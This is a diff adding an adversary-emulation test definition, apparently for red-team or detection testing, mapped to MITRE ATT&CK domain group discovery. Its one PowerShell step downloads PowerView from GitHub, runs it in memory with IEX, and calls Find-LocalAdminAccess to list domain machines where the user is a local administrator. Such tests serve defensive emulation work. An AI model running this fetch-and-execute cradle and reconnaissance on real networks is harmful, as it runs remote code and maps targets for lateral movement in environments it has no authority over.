@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: Find machines where user has local admin access (PowerView)
+description: |
+    Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.
+uuid: a2d71eee-a353-4232-9f86-54f4288dd8c1
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1069: Permission Groups Discovery'
+    subtechniques:
+        - 'T1069.002: Domain Groups'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: find-machines-where-user-has-local-admin-access-(powerview)
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
